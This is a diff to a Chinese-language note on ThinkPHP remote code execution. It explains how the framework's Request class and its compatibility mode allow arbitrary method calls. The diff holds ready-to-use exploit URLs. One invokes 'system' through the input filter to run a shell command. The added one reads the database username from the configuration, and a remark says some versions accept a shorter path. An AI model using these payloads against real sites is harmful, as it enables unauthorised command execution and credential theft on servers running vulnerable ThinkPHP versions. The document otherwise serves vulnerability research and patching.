@@ -18,7 +18,9 @@ Request类的method方法$this->method可控导致可以调用__contruct()覆盖
 Request 类中的 param、route、get、post、put、delete、patch、request、session、server、env、cookie、input 方法均调用了 filterValue 方法
 - 第二种
 
-`?s=index/\think\Request/input&filter[]=system&data=pwd`   
+`?s=index/\think\Request/input&filter[]=system&data=pwd`  
+某些版本可以不要`/\`   
+`?s=index/think\config/get&name=database.username`
 
 开启兼容模式，未合法校验传入的控制器，导致任意类方法调用。
 
